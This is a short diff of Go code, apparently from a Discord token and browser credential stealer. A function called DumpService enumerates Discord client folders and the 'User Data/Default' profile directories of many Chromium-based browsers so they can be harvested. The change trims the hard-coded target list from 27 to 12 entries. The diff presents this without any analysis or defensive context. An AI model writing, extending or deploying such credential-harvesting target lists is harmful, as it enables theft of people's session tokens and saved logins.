@@ -26,7 +26,7 @@ func DumpService() []string {
 
 	var T []string
 
-	PLATFORMS := [27]string{
+	PLATFORMS := [12]string{
 		HOME + "/discord",
 		HOME + "/discordcanary",
 		HOME + "/discordptb",
@@ -37,23 +37,8 @@ func DumpService() []string {
 		HOME + "/Yandex/YandexBrowser/User Data/Default",
 		HOME + "/Chromium/User Data/Default",
 		HOME + "/Epic Privacy Browser/User Data/Default",
-		HOME + "/Amigo/User Data/Default",
 		HOME + "/Vivaldi/User Data/Default",
-		HOME + "/Orbitum/User Data/Default",
-		HOME + "/Mail.Ru/Atom/User Data/Default",
-		HOME + "/Kometa/User Data/Default",
-		HOME + "/Comodo/Dragon/User Data/Default",
-		HOME + "/Torch/User Data/Default",
-		HOME + "/Comodo/User Data/Default",
 		HOME + "/Slimjet/User Data/Default",
-		HOME + "/360Browser/Browser/User Data/Default",
-		HOME + "/Maxthon3/User Data/Default",
-		HOME + "/K-Melon/User Data/Default",
-		HOME + "/Sputnik/Sputnik/User Data/Default",
-		HOME + "/Nichrome/User Data/Default",
-		HOME + "/CocCoc/Browser/User Data/Default",
-		HOME + "/uCozMedia/Uran/User Data/Default",
-		HOME + "/Chromodo/User Data/Default",
 	}
 
 	for _, PLATFORM := range PLATFORMS {
